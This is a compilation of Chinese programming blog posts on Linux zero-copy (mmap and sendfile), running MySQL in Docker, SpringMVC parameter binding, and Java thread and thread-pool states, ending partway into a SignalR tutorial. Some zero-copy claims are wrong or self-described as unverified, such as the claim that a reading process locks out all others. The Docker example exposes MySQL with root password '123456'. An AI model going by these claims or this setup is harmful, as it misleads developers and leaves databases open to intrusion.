为什么mmap比sendfile内存安全性控制复杂，为什么mmap会引起JVM Crash？
为什么sendfile只能是BIO的，不能使用NIO？
为什么mmap对于小块数据传输的需求效果更好？

这个问题其实很好解答，如果上一个说法成立，mmap支持NIO，sendfile只能BIO传输，那么NIO的特性本身就会对数据块小、请求个数多的传输需求有很好的支持。

1. 零拷贝 Zero copy
1.1 no zero-copy
Web应用程序通常提供大量静态内容，例如使用聊天工具向好友发送了一张本地图片，应用程序需要从磁盘读取图片数据，并将完全相同的数据写到响应socket中，通过网络发送给对方。这个操作看起来貌似不需要占用过多的CPU资源，因为没有计算的需求，但仍然效率较低：内核从磁盘读取数据并将其推送到应用程序，然后应用程序将其推回到内核写到套接字。这种场景下，应用程序充当了一个低效的中介，它将数据从磁盘文件获取到套接字。
1.2 zero copy
每次数据经过用户内核边界时，都必须复制一次数据，这会消耗CPU周期和内存带宽。zero-copy技术的出现就是通过减少复制次数来消除这些副本。使用零拷贝请求的应用程序，内核将数据直接从磁盘文件复制到套接字，而不用 无需通过应用程序。零拷贝极大地提高了应用程序性能，并减少了内核和用户模式之间的上下文切换次数。
1.3 Java中的zero copy
Java类库通过java.nio.channels.FileChannel中的transferTo()方法在Linux和UNIX系统上支持零拷贝。使用transferTo()法将字节直接从调用它的通道传输到另一个可写字节通道，而不需要数据流经应用程序。
本文先解释下传统复制，然后介绍zero copy的几种机制，最后解释前言中的疑问。
1.4 类比举例
在干货之前，先喝口汤压压惊。举个通俗点的例子来类比描述传统的 no zero-copy的做法，A用左手拿筷子要吃饭，B告诉你A，你需要用右手拿筷子，然后A把筷子从左手给了B，然后B又把筷子塞到A的右手里，A开始吃饭。

A和B这里可以看成两个上下文，A的左手传递筷子给B之后，切换到了B的上下文，B传递给A的右手，又切换回A的上下文，这个代价其实是非常昂贵的。
为了减少这种昂贵的代价，我们可以想象一些场景来逐步降低事情的复杂度。
最直观最简单的方法，B只需要告诉A，也就是说B发出一条指令，A接收指令之后，自己把筷子从左手换到右手，就可以既减少了上下文的切换，减轻了B的压力，又减少了传递的次数和沟通代价。然而这需要A具备这样的功能，计算机中某些硬件可以提供这样的支持，但是如果A是一个不满3岁的孩子，他可能听不懂你的话，又或者不明白如何把筷子从左手转到右手。
这个时候B只需要扶住A的左手，帮他把筷子换到右手里。这样，也缩减了这个过程中的代价。

2. 传统传输方式
Linux标准访问文件方式
在Linux中，访问文件的方式是通过两个系统调用实现的：read()和write()。
当应用程序调用read()系统调用读取一块数据的时候：

如果该块数据已经在内存中，就直接从内存中读取数据并返回给应用程序；
如果该块数据不在内存中，name数据会被从磁盘上读取到页缓存中，再从页缓存中拷贝到用户地址空间中去。

如果一个进程读取某个文件，那么其他进程就都不可以读取或者更改该文件；对于写操作，当一个进程调用了write()系统调用往某个文件中写数据的时候，数据会先从用户地址空间拷贝到操作系统内核地址空间的页缓存中，然后才被写到磁盘上。
对于这种标准的访问文件方式，在数据被写到页缓存中时，write()系统调用就算执行完成，并不会等数据完全写入到磁盘上。
Linux在这里采用的是延迟写机制。

一般情况下，应用程序采取的写操作机制有三种：

同步写(Synchronous Writes)，数据会立即从缓存页写回磁盘，应用程序会一直等待到写入磁盘的结束。
异步写(Asynchronous Writes)，数据写入缓存页后，操作系统会定期将页缓存中的数据刷到磁盘上，在写入磁盘结束后，系统会通知应用程序写入已完成。
延迟写(Deferred Writes)，数据写入缓存页后立即返回应用程序写入成功，操作系统定期将页缓存中是数据刷入磁盘，由于写入页缓存时已经返回吸入成功，写入磁盘之后不会通知应用程序。因此延迟写机制是存在数据丢失的风险的。


2.1 传输过程

图1. 传统方式数据传输示意图
如上图所示，数据按箭头的方向流动，从本地终端的硬盘存储中读取数据，经过4次copy，最终到达NIC buffer，通过网卡再发送给其他终端。
这种传输方式实际上是一种经过优化的设计，虽然看起来效率比较低下，但是内核缓冲区的存在使得整个流程的性能得到了提升。内核缓冲区的引入充当了预读缓存的角色，使得数据并不是直接从硬盘到用户缓冲区，而是允许应用程序在未请求的情况下，内核缓冲区中已经存在了相应的数据。
内核空间内，内存与硬件存储之间的数据传输使用了DMA直接内存存取的复制方式，这种方式不需要CPU的参与，并且提高读取速度。CPU也因此可以趁机去完成其他的工作。

例如用户缓冲区大小为4K，内核缓冲区大小为8K，文件总大小为40K，每次用户请求读取4K数据时，内核缓冲区中已经预读存入了相应的数据。
硬盘到内存(内核缓冲区)的数据传输速度是比较慢的，尤其是SSD应用之前，而内核缓冲区到用户缓冲区这种内存到内存的复制相对较快，用户缓冲区就不用等待硬盘数据传输到内存。广义上也是一种空间换时间的做法。

然而，一些情况下内核缓冲区也无法完全跟上应用程序的步伐，比如用户缓冲区的大于内核缓冲区的大小。预读的数据无法满足需要，仍然需要等待硬盘到内存的缓慢传输。此时性能将会大打折扣。
尽管做了很多优化，如图所示，数据已经被复制了至少四次，并且执行了多次的用户和内核上下文的切换。实际上这个过程比图示要复杂得多。
2.2 上下文切换和数据复制过程

图2.上下文切换和数据复制
图2所示是传统方式数据传输(图1)时上下文切换和数据复制的过程。上半部分表示上下文切换，下半部分表示数据复制流程。
step 1
系统调用读操作时，上下文会从用户模式切换到内核模式。在内核空间中，DMA引擎执行了第一次数据拷贝，将数据从硬盘等其他存储设备上导入到内核缓冲区。
step 2
数据从内核缓冲区拷贝到用户缓冲区，系统调用读操作结束并返回。调用的返回会导致又一次的上下文切换，上下文从内核又切换到用户模式。
step 3
系统写操作开始调用，进行第三次数据复制，将数据从用户缓冲区写回内核的socket缓冲区，此时回引起一次从用户模式到内核模式的上下文切换。
step 4
写操作的系统调用返回，引起第四次上下文切换。开始第四次数据复制，数据从内核缓冲区复制到协议引擎。这次复制是异步并且独立的，系统不保证数据一定会传输，这次返回只是任务提交成功，数据包进入了队列，等待传输。就像线程池模型中任务提交时，任务只是成功提交到任务队列，何时开始执行上游调用程序并不知情。
summary
传统的传输方式会存在大量的数据复制和上下文切换，如果这些重复可以消除一部分，就可以减少开销并提升性能。某些硬件可以绕过主存储器将数据直接传输到另一个设备，但是如1.4中的类比描述一样，并不是所有硬件都支持这项功能，而且这项功能的实现远非这么简单。
为了降低开销，我们可以减少复制，而不是直接消除复制。
系统为了减少复制所采用的所有方式中，最多的就是让这些传输尽可能不跨越用户空间和内核空间的边界，因为每次跨越边界就意味着一次复制。
3. zero-copy mmap

图3. mmap方式零拷贝数据传输示意图
mmap系统调用的方式如下：
tmp_buf = mmap(file, len);
write(socket, tmp_buf, len);
这种方式用到两种系统调用，mmap+write。
这种传输方式使用mmap()代替了read()，磁盘上的数据会通过DMA被拷贝到内核缓冲区，然后操作系统会把这块内核缓冲区与应用程序共享，这样就避免了跨越边界的一次复制。应用程序再调用write()直接将内核缓冲区的内容拷贝到socket缓冲区，最后系统把数据从socket缓冲区传输到网卡。
mmap减少了一次拷贝，提升了效率。但是mmap也可能遇到一些隐藏的问题。例如，当应用程序map了一个文件，但是这个文件被另一个进程截断时，write()系统调用会因为访问非法地址而被SIGBUS信号终止。SIGBUS信号默认会杀死你的进程并产生一个coredump。
解决mmap上述问题的方式通常有两种：

增加对SIGBUS信号的处理程序
当遇到SIGBUS信号时，处理程序可以直接去调用return，这样,write调用在被中断之前返回已经写入的字节数并且将errno设置为success。但是这么处理显得较为粗糙。
使用文件租借锁
在文件描述符上使用租借锁，这样当有进程要截断这个文件时，内核会立刻发送一个RT_SIGNAL_LEASE信号，这样在程序访问非法内存之前，中断write调用，返回已经写入的字节数，并将errno设置为success，而不必等到write被SIGBUS杀死再做处理。


图4 mmap上下文切换与数据传输
如上图所示，mmap+write的复制减少了文件的复制，但是上下文切换的次数和read+write的方式是一样的。
4. sendfile

图5 sendfile数据传输示意图
Linux的内核版本2.1之后，系统引入了sendfile来简化文件传输到网络的工作，这种方式不仅减少了拷贝次数，也减少了上下文的切换。
使用sendfile代替了read+write操作。

图6 sendfile上下文切换与数据传输
数据发生三次拷贝，首先sendfile系统调用，通过DMA引擎将文件复制到内核缓冲区。
在内核区，内核将数据复制到socket缓冲区。
最后，DMA引擎将数据从内核socket缓冲区传递到协议引擎中(网卡)。
sendfile是否会遇到和mmap同样的隐藏问题？

如果另一个进程截断了使用sendfile传输的文件，sendfile在没有任何信号处理程序的情况下，会返回被中断前传输的字节数，并且errno被设置为success。
如果使用了文件租借锁，sendfile可以获得RT_SIGNAL_LEASE信号，并给出和没有使用文件租借锁同样的返回。

5. 使用DMA gather copy的sendfile
在内核2.4版本之后，sendfile可以在硬件支持的情况下实现更高效的传输。

图7 使用DMA gather copy的sendfile数据传输示意图
在硬件的支持下，不再从内核缓冲区的数据拷贝到socket缓冲区，取而代之的仅仅是缓冲区文件描述符和数据长度的拷贝。
这样DMA引擎直接将页缓存中数据打包发送到网络中即可。

图8 DMA gather copy的sendfile上下文切换与数据传输
这种方式避免了最后一次拷贝，并且减轻了CPU的负担，省去了页缓存到socket缓冲区的CPU Copy。这种sendfile是Linux中真正的零拷贝，虽然依然需要磁盘到内存的复制，但是内核空间和用户空间内已经不存在任何多余的复制。
这种方式的前提是硬件和相关驱动程序支持DMA Gather Copy。
6.总结
通过以上描述，可以解答文章开始的几个问题。
为什么mmap会多消耗CPU？
mmap没有完全消除内存中的文件复制，从页缓存到socket缓冲区需要进行CPU Copy，并且上下文的切换次数和传统的read+write方式一样。
因此，相对于sendfile，mmap会占用更多的CPU资源。
为什么mmap比sendfile内存安全性控制复杂，为什么mmap会引起JVM Crash？
mmap没有提供被其他进程截断时的处理，需要添加对SIGBUS信号中断的处理。由于截断后，mmap访问了非法内存，SIGBUS信号会导致JVM Crash的问题。
为什么sendfile只能是BIO的，不能使用NIO？(个人理解，未验证)
sendfile在使用DMA gather copy的情况下，降低了CPU资源的占用，减少了文件复制和上下文切换次数，但是由于socket缓冲区中拿到的只是文件描述符和数据长度，并没有拿到真正的文件，因此并不能执行write等相关操作异步写或者延迟写，只能进行同步写。这也是减少上下文切换付出的代价，接收到sendfile后，都在内核态执行，缺少应用程序的干预因此可控性也较差。所以sendfile只能使用BIO这种同步阻塞的IO。
However, 在大文件的传输上，sendfile依然是最佳的方式。
Java中NIO的类库通过java.nio.channels.FileChannel中的transferTo()依赖的零拷贝是sendfile，因此实质上transferTo并不支持真正意义上的NIO。
而mmap+write的方式，使真正的文件被复制到socket缓冲区，从socket缓冲区到网卡的复制过程是可以异步的，但是这种操作意味着更多的CPU消耗。
RocketMQ中更多的需求是小文件的传输，而NIO的特性可以更快更高效的应对这种场景。在这种权衡考量下，牺牲部分CPU资源来换取更高的文件传输效率的选择显然是一种更优的方案。

********************************************************************************************************************************************************************************************************
在docker中运行mysql实例
Docker是一种新兴的虚拟化技术，能够一定程度上的代替传统虚拟机。下图是容器跟虚拟机的对比

对docker有个大致了解，学习docker断断续续，虽说学习不能急于求成，但断断续续学的话，浪费的碎片化时间也是不少的。
学习docker如果不愿意看文章可以看慕课网的一个免费的视频讲解，入门完全ok。
可以在docker hub上注册个账号，构建自己的镜像放到hub上，以便复用
docker hub地址 
我的地址
慕课网学习地址
年前给公司的同事培训过一次学习mysql，在阿里云服务器上使用docker给每个同事都搭建了一个msyql运行环境，差点没跑起来，
一个运行起来的空的mysql容器占用了约200M内存，free -h命令可以查看内存使用情况
慕课网手记 （培训的资料准备笔记）
总结下使用docker搭建mysql实例的过程
我的是centos系统
查看linux版本可以通过下面命令进行查看 

cat /proc/version


安装docker，参考 https://blog.csdn.net/u010046908/article/details/79553227
安装mysql，可以通过search命令查看仓库的mysql的各个版本

docker search mysql


通过pull命令进行拉去镜像操作，默认拉去的是latest版本，可以通过冒号来下载指定版本，如想下载5.7的mysql

docker pull mysql:5.7

 具体有哪些版本可以查看hub，如下图

现在下来后可以通过 docker images 命令查看下载的镜像

想运行mysql，把它放到容器里面运行下就ok(貌似说的不咋合理)
运行直线需要做一些配置，比如数据库data的存放位置，以及自定义的一些配置，比如mysql默认是区分大小写的
我是在当前的用户下面进行操作的，如下

创建一个data文件夹用于存放mysql的表结构，数据等信息
创建一个my.cnf文件来进行自定义参数设置，内容如下

[mysqld]
user=mysql
sql_mode=STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
lower_case_table_names=1
event_scheduler=ON
default-time-zone = '+8:00'

event_scheduler=ON 表示开启事件支持
lower_case_table_names=1 表示数据库不区分大小写
default-time-zone = '+8:00' 表示使用中国时区
ok，准备就绪，启动干就完了。
具体命令

docker run -d -p 3306:3306  -e MYSQL_ROOT_PASSWORD=123456 --name cmysql -v /home/chy/mysql/config/my.cnf:/etc/mysql/my.cnf -v /home/chy/mysql/db:/var/lib/mysql mysql:5.7

各个参数说明

run：运行一个容器
-d：看做做守护线程(Daemon)
-p：进行端口映射，用于暴露给外界让其访问
-e：初始化root用户的密码
--restar=always：自动重启，比如服务器突然断电，重启服务器之后不需要你重新手动启动
--name：自定义容器名称
-v：挂载。容器里面的数据你是不能直接访问的，但是你可以将可见目录挂载上去，这样就可以访问了（解释的不咋到位）

启动成功之后会出现一个随机字符串，表示容器的id
可以通过docker ps查看，我是启动了两个。docker ps -a 查看所有容器

启动之后，由于进行了端口映射，可以通过客户端工具入sqlyog，Navicat都可以进行连接
如果想进入容器进行操作，可以通过如下命令

要想退出使用exit，快捷键Ctrl+d
删除容器可以通过

docker rm cmysql

当然了，前提是容器需要关闭，关闭的命令

docker stop cmysql

一样的道理，删除镜像也需要前提条件，那就是被依赖的容器删除了才能进行删除镜像

docker rmi <image id>

ok，到位， 好记性不如烂笔头，特此总结下。
补充些docker基础概念知识
Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口
镜像(Image)
镜像，从认识上简单的来说，就是面向对象中的类，相当于一个模板。从本质上来说，镜像相当于一个文件系统。Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。
容器(Container)
容器，从认识上来说，就是类创建的实例，就是依据镜像这个模板创建出来的实体。容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。
仓库(Repository)
仓库，从认识上来说，就好像软件包上传下载站，有各种软件的不同版本被上传供用户下载。镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。
 
********************************************************************************************************************************************************************************************************
《SpringMVC从入门到放肆》九、SpringMVC注解式开发（简单参数接收）
上一篇我们学习了注解式开发的配置方式并写了一个小Demo跑起来。今天我们来学习注解开发的参数接收。处理器方法中的常用参数有五类，这些参数会在系统调用时由系统自动赋值，即程序员可以在方法中直接使用。具体如下：
1：HttpServletRequest
2：HttpServletResponse
3：HttpSession
4：用户承载数据的Model
5：请求中所携带的请求参数
在进行参数接收之前我们先在/WebRoot/index.jsp下添加如下内容：

<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <title>My JSP 'index.jsp' starting page</title>
  </head>
  
  <body>
    <form action="${pageContext.request.contextPath }/user/register.do">
        姓名：<input name="name" type="text" />
        年龄：<input name="age" type="text" />        
        <input type="submit" value="注册" />
    </form>
  </body>
</html>

 
在/WEB-INF/jsp/下建立success.jsp，内容如下：

<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <title>SpringMVC1</title>
  </head>
  
  <body>
    姓名：${name }<br />
    年龄：${age }
  </body>
</html>

 
接下来我们着重来看在Controller中如何进行参数的接收。
 
一、逐个接收
在cn.wechatbao.controller包下新建UserController，内容如下：

package cn.wechatbao.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
@RequestMapping("/user")
public class UserController {

    @RequestMapping("/register.do")
    public ModelAndView register(String name,int age) throws Exception {
        ModelAndView mv = new ModelAndView();
        mv.addObject("name", name);
        mv.addObject("age", age);
        mv.setViewName("/WEB-INF/jsp/success.jsp");
        return mv;
    }
}

 
注意：当程序写到这里的时候，功能基本就没有什么问题了，但是有一个小bug，就是前台传中文姓名的时候，会乱码。当然这个问题我们必须要考虑。只是这个问题由SpringMVC帮我早就考虑到了，所以我们只需要在web.xml中配置一个过滤器就OK了。
 
二、解决中文乱码
上面说了作为优秀的大型框架，SpringMVC已经为我们考虑了统一编码的问题。所以我们直接在web.xml中配置使用就OK了，具体配置方式如下：

<filter>
    <filter-name>characterEncodingFilter</filter-name>
    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
    <init-param>
        <param-name>encoding</param-name>
        <param-value>utf-8</param-value>
    </init-param>
    <init-param>
        <param-name>forceRequestEncoding</param-name>
        <param-value>true</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>characterEncodingFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

 
有的朋友可能看到这里的时候，已经迫不及待的试了一下。但是发现可能还是乱码。不要着急。这是由于tomcat已经配置了编码格式，server.xml里如果不配置编码格式，则默认是iso-8859-1，于是我们来修改tomcat的conf/server.xml文件，如下：

<Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443" />

 
修改为：

<Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443" URIEncoding="UTF-8"/>

 
三、校正请求参数名
假设前台的input的name为personName，而后台Controller需要接收的参数名称为name，这时我们就需要用另一个注解来校正请求参数名。如下

@RequestMapping("/register.do")
public ModelAndView register(@RequestParam("personName") String name,int age) throws Exception {
    System.out.println("name="+name);
    System.out.println("age="+age);
    ModelAndView mv = new ModelAndView();
    mv.addObject("name", name);
    mv.addObject("age", age);
    mv.setViewName("/WEB-INF/jsp/success.jsp");
    return mv;
}

 
注意：@RequestParam("personName") String name该写法就是将前台的personName和后台的name进行一个映射。使之对应起来。
********************************************************************************************************************************************************************************************************
从源码解读线程（Thread）和线程池（ThreadPoolExecutor）的状态
线程是比进程更加轻量级的调度执行单位，理解线程是理解并发编程的不可或缺的一部分；而生产过程中不可能永远使用裸线程，需要线程池技术，线程池是管理和调度线程的资源池。因为前不久遇到了一个关于线程状态的问题，今天就趁热打铁从源码的层面来谈一谈线程和线程池的状态及状态之间的转移。
线程
JDK中，线程（Thread）定义了6种状态：  NEW（新建）、RUNNABLE（可执行）、BLOCKED（阻塞）、WAITING（等待）、TIMED_WAITING（限时等待）、TERMINATED（结束）。
源码如下：

    /**
     * A thread state.  A thread can be in one of the following  states:
     * <ul>
     * <li>{@link #NEW}

     *     A thread that has not yet started is in this state.
     *     </li>
     * <li>{@link #RUNNABLE}

     *     A thread executing in the Java virtual machine is in  this state.
     *     </li>
     * <li>{@link #BLOCKED}

     *     A thread that is blocked waiting for a monitor lock
     *     is in this state.
     *     </li>
     * <li>{@link #WAITING}

     *     A thread that is waiting indefinitely for another  thread to
     *     perform a particular action is in this state.
     *     </li>
     * <li>{@link #TIMED_WAITING}

     *     A thread that is waiting for another thread to perform  an action
     *     for up to a specified waiting time is in this state.
     *     </li>
     * <li>{@link #TERMINATED}

     *     A thread that has exited is in this state.
     *     </li>
     * </ul>
     *
     * <p>
     * A thread can be in only one state at a given point in  time.
     * These states are virtual machine states which do not  reflect
     * any operating system thread states.
     *
     * @since   1.5
     * @see #getState
     */
    public enum State {
        /**
         * Thread state for a thread which has not yet started.
         */
        NEW,
        /**
         * Thread state for a runnable thread.  A thread in the  runnable
         * state is executing in the Java virtual machine but it  may
         * be waiting for other resources from the operating  system
         * such as processor.
         */
        RUNNABLE,
        /**
         * Thread state for a thread blocked waiting for a  monitor lock.
         * A thread in the blocked state is waiting for a monitor  lock
         * to enter a synchronized block/method or
         * reenter a synchronized block/method after calling
         * {@link Object#wait() Object.wait}.
         */
        BLOCKED,
        /**
         * Thread state for a waiting thread.
         * A thread is in the waiting state due to calling one of  the
         * following methods:
         * <ul>
         *   <li>{@link Object#wait() Object.wait} with no  timeout</li>
         *   <li>{@link #join() Thread.join} with no timeout</li>
         *   <li>{@link LockSupport#park() LockSupport.park}</li>
         * </ul>
         *
         * <p>A thread in the waiting state is waiting for  another thread to
         * perform a particular action.
         *
         * For example, a thread that has called  <tt>Object.wait()</tt>
         * on an object is waiting for another thread to call
         * <tt>Object.notify()</tt> or  <tt>Object.notifyAll()</tt> on
         * that object. A thread that has called  <tt>Thread.join()</tt>
         * is waiting for a specified thread to terminate.
         */
        WAITING,
        /**
         * Thread state for a waiting thread with a specified  waiting time.
         * A thread is in the timed waiting state due to calling  one of
         * the following methods with a specified positive  waiting time:
         * <ul>
         *   <li>{@link #sleep Thread.sleep}</li>
         *   <li>{@link Object#wait(long) Object.wait} with  timeout</li>
         *   <li>{@link #join(long) Thread.join} with  timeout</li>
         *   <li>{@link LockSupport#parkNanos  LockSupport.parkNanos}</li>
         *   <li>{@link LockSupport#parkUntil  LockSupport.parkUntil}</li>
         * </ul>
         */
        TIMED_WAITING,
        /**
         * Thread state for a terminated thread.
         * The thread has completed execution.
         */
        TERMINATED;
    }

状态说明
线程在一个给定的时间点只能处于下面其中一种状态：
这些状态是虚拟机状态，并不能反映任何操作系统的线程状态。

NEW：尚未启动的线程处于这个状态。


RUNNABLE：正在Java虚拟机中执行的线程处于这个状态。


BLOCKED：阻塞，等待监视器锁的线程处于这个状态。


WAITING：无限期等待另一个线程执行特定操作的线程处于这种状态。


TIMED_WAITING：正在等待另一个线程执行某个操作的线程在指定的等待时间内处于这种状态。


TERMINATED：已经退出的线程处于这个状态。

状态转移
NEW：线程尚未启动的线程状态。当在程序中创建一个线程的时候Thread t = new Thread(Runnable);，线程处于NEW状态。
RUNNABLE：可运行线程的线程状态。处于可运行状态的线程正在Java虚拟机中执行，但它可能正在等待操作系统中的其他资源，比如处理器。也就是说， 这个状态就是可运行可不运行的状态。注意Runnable ≠ Running。
BLOCKED：等待监视器锁的阻塞线程的线程状态。比如，线程试图通过synchronized去获取某个锁，但是其他线程已经独占了，那么当前线程就会处于阻塞状态。处于阻塞状态的线程正在等待监视器锁去进入同步块/方法（等待一个监视器锁时为了进入同步块/方法），或者在调用Object.wait()后重新进入同步块/方法。
WAITING：调用以下方法之一，线程会处于等待状态：

Object.wait()注意：括号内不带参数；
 Thread.join()注意：扩号内不带参数；
 LockSupport.park()；

其实wait()方法有多重形式，可以不带参数，可以带参数，参数表示等待时间（单位ms），如图所示：

“BLOCKED（阻塞状态）”和“WAITING（等待状态）”的区别：阻塞状态在等待获取一个排它锁，这个事件将会在另外一个线程放弃这个锁的时候发生，然后由阻塞状态变为可执行状态；而等待状态则是在等待一段时间，或者等待唤醒动作的发生。
TIMED_WAITING：一个线程调用了以下方法之一（方法需要带具体的等待时间），会处于定时等待状态：

Thread.sleep(long timeout)
Object.wait(long timeout)
Thread.join(long timeout)
LockSupport.parkNanos()
LockSupport.parkUntil()

TERMINATED：   该线程已经执行完毕。
其实这些大部分在源码的注释中可以找到。下面我自己翻译的中文版，不嫌弃的话可以参考：

    /**
     * 线程状态。  一个线程可以处于下列状态之一：
     *
     * NEW：尚未启动的线程处于这个状态。
     *     
     * RUNNABLE：正在Java虚拟机中执行的线程处于这个状态。
     *
     * BLOCKED：阻塞中，等待监视器锁的线程处于这个状态。
     *
     * WAITING：无限期等待另一个线程执行特定操作的线程处于这种状态。
     *
     * TIMED_WAITING：正在等待另一个线程执行某个操作的线程在指定的等待时间内处于这种状态。
     *
     * TERMINATED：已经退出的线程处于这个状态。
     *
     * 线程在一个给定的时间点只能处于一种状态。
     * 这些状态是虚拟机状态，并不能反映任何操作系统的线程状态。
     *
     */
    public enum State {
        /**
         * 线程尚未启动的线程状态。
         */
        NEW,


        /**
         * 可运行线程的线程状态。处于可运行状态的线程正在Java虚拟机中执行，
         * 但它可能正在等待操作系统中的其他资源，比如处理器。
         */
        RUNNABLE,


        /**
         * 等待监视器锁的阻塞线程的线程状态。
         * 处于阻塞状态的线程正在等待监视器锁进入同步块/方法，
         * 或者在调用Object.wait后重新进入同步块/方法。
         */
        BLOCKED,


        /**
         * 等待线程的线程状态。
         * 调用以下方法之一，线程会处于等待状态：
         *   Object.wait()注意：括号内不带参数；
         *   Thread.join()注意：扩号内不带参数；
         *   LockSupport.park()；
         *
         * 处于等待状态的线程正在等待另外一个线程执行特定的操作。
         *
         * 例如，一个调用了object.wait()方法的线程正在等待另外一下线程调用
         * object.notify()或者object.notifyAll()方法。注意，这两个object是同一个object。
         * 一个调用了Thread.join()方法的线程正在等待一个特定的线程去终止。
         */
        WAITING,


        /**
         * 具有指定等待时间的等待线程的线程状态。
         * 一个线程调用了以下方法之一（方法需要带具体的等待时间），会处于定时等待状态:
         *   Thread.sleep(timeout)
         *   Object.wait(timeout)
         *   Thread.join(timeout)
         *   LockSupport.parkNanos()
         *   LockSupport.parkUntil()
         */
        TIMED_WAITING,


        /**
         * 终止的线程状态。
         * 该线程已经执行完毕。
         */
        TERMINATED;
    }

状态转移图如图所示：

线程池
在生产环境中，为每个任务分配一个线程是存在缺陷的，例如资源消耗和稳定性等，所以需要使用线程池。
Java类库提供了灵活的线程池，可以调用Executors中的静态工厂方法创建线程池。如

newFixedThreadPool：固定长度的线程池
newCachedThreadPool：可缓存的线程池。

不管是newFixedThreadPool还是newCachedThreadPool，底层都是通过ThreadPoolExecutor实现的，本文只谈ThreadPoolExecutor的状态。
在JDK源码中，线程池（ThreadPoolExecutor）定义了五种状态：RUNNING、SHUTDOWN、STOP、TIDYING和TERMINATED。
源码如下：

    private static final int RUNNING    = -1 << COUNT_BITS;
    private static final int SHUTDOWN   =  0 << COUNT_BITS;
    private static final int STOP       =  1 << COUNT_BITS;
    private static final int TIDYING    =  2 << COUNT_BITS;
    private static final int TERMINATED =  3 << COUNT_BITS;

状态说明


RUNNING — 运行状态，可以添加新任务，也可以处理阻塞队列中的任务。 




SHUTDOWN — 待关闭状态，不再接受新的任务，会继续处理阻塞队列中的任务。 


STOP — 停止状态，不再接受新的任务，不会执行阻塞队列中的任务，打断正在执行的任务。 


TIDYING — 整理状态，所有任务都处理完毕，workerCount为0，线程转到该状态将会运行terminated()钩子方法。


TERMINATED — 终止状态，terminated()方法执行完毕。


状态转移


     * RUNNING -> SHUTDOWN
     *    On invocation of shutdown(), perhaps implicitly in  finalize()
     * (RUNNING or SHUTDOWN) -> STOP
     *    On invocation of shutdownNow()
     * SHUTDOWN -> TIDYING
     *    When both queue and pool are empty
     * STOP -> TIDYING
     *    When pool is empty
     * TIDYING -> TERMINATED
     *    When the terminated() hook method has completed




线程池的初始化状态是RUNNING。换句话说，线程池被一旦被创建，就处于RUNNING状态，并且线程池中的任务数为0。


当线程池处于RUNNING状态时，调用shutdown()方法，线程池RUNNING状态转为SHUTDOWN状态。


当线程池处于RUNNING or SHUTDOWN时，调用shutdownNow()方法时，线程池由(RUNNING or SHUTDOWN )状态转为STOP状态。


当线程池在SHUTDOWN状态下，阻塞队列为空并且线程池中执行的任务也为空时，就会由 SHUTDOWN状态转为TIDYING状态。 


当线程池处于STOP状态，当线程池中执行的任务为空的时候，线程池有STOP状态转为TIDYING状态。


当线程池处于TIDYING状态，当执行完terminated()之后，就会由TIDYING状态转为TERMINATED状态。


状态转移图如图所示：

总结
理解线程和线程池对于我们日常开发或者诊断分析，都是不可或缺的基础。本文从源码分析了线程和线程池的状态和各种方法之间的对应关系，希望对大家有帮助，文中如果有地方不妥还请大家指正。
 
********************************************************************************************************************************************************************************************************
SignalR第一节-在5分钟内完成通信连接和消息发送
前言
首先声明，这又是一个小白从入门到进阶系列。
SignalR 这个项目我关注了很长时间，中间好像还看到过微软即将放弃该项目的消息，然后我也就没有持续关注了，目前的我项目中使用的是自己搭建的 WebSocket ，连接管理和消息推送都是统一维护；前段时间编写了 Asp.NETCore 轻松学系列，现在腾出了一点时间，抱着学习的心态，想把自己学习 SignalR 的过程写出来，就当笔记吧，再做笔记的过程中再加入实际的项目需求，一步一步的深入学习 SignalR ，正所谓技多不压身吧。有想要一起学习的同学，可以关注我，大家一起学习，一起进步。
SignalR 简单介绍
根据官方文档介绍，SignalR 是一个面向开发人员的库，其本质是对 Web实时连接（WebSocket） 的抽象和封装，使用 SIgnalR，可以避免自己编写和管理Web实时连接，并获得更多客户端的兼容性，截止本文发文为止，SignalR npm 包的版本是 @aspnet/signalr-1.1.2，在 Asp.NETCore 中，SignalR 不支持自动重连，如果客户端连接断开，必须显示重连。话不多说，下面就开始干吧。
1.项目搭建
1.1 搭建 Asp.NETCore 项目基架
本 SignalR 示例基于 .NETCore-2.2 ，所以，我们还是先搭建一个简单的 Asp.NETCore WebApplication

选择 .NETCore-2.2 ,取消 Https 选择，因为如果选择 Https 还需要安装测试证书，为了时间，就别勾选了。

项目创建完成，什么也别做，按下 F5 运行网站，看到如下界面

好的，运行没有问题，我们现在先停止网站，做一些简单的编码工作
1.2 引用 SignalR for JavaScript 客户端 SDK
由于 .NETCore 内置了 SignalR 组件，我们无需额外引用服务组件，但是需要手动添加 SignalR JavaScript 客户端 SDK,按下图指示添加客户端引用：


